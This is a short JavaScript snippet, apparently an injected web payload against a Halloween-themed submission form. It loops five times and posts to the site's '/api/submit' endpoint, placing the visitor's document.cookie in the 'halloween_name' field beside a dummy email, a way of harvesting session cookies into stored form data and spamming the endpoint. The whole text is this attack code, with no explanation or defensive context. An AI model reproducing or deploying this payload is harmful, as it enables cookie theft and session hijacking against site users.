for(let i=0;i<5;i++){
  fetch('/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({halloween_name:document.cookie,email:'x@x.com',costume_type:'ghost',trick_or_treat:'tricks'})});
}
